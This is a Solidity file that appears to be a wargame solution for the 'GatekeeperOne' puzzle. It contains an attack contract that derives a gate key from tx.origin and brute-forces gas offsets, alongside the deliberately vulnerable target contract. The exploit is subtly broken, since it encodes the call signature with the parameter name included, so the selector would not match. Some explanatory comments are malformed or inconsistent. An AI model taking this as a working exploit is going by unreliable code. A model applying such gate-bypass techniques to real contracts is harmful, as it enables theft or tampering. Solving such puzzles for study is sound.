// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Gatekeeper1Attack{

    /*mod1 pass:
        msg.sender=contract address
        tx.origin=my account EOA
    */

    /*
        mod2:
     *
     /
    /*
        uint8 =8 bits = 1 byte
        uint256 =256 bits = 32 bytes

        mod3:
        bytes8 _gateKey= 0x b1 b2 b3 b4 b5 b6 b7 b8
        part 1:
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)
            uint64(_gateKey)= 0x b1 b2 b3 b4 b5 b6 b7 b8
            uint32(_gateKey)= 0x b5 b6 b7 b8
            uint16(_gateKey)= 0x 00 00 b7 b8

        part 2:
            uint32(uint64(_gateKey)) != uint64(_gateKey)
            uint32(uint64(_gateKey))= 0x b5 b6 b7 b8
            uint64(_gateKey)= 0x b1 b2 b3 b4 00 00 b7 b8

        part 3:
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)
            uint32(uint64(_gateKey))= 0x 00 00 b7 b8
            uint160(tx.origin)= numeric equivalent of my EOA (0x.....64)
            uint16(uint160(tx.origin))= 16 bits = 2 bytes = 0x 00 00 b7 b8
            uint32(uint64(_gateKey)) = 0x b5 b6 b7 b8


            2 hex characters=1 byte
            64bits = 8bytes = 16 hex characters
     */

     function attack(address _target) external{
     bytes8 getKey=bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        for(uint i=0;i<300;i++){
            uint totalGas=(8191*3)+i;
        (bool result,)=_target.call{gas:totalGas}(abi.encodeWithSignature("enter(bytes8 _gateKey)", getKey));
            if(result){
              break;
            }
        }
     }

}




contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}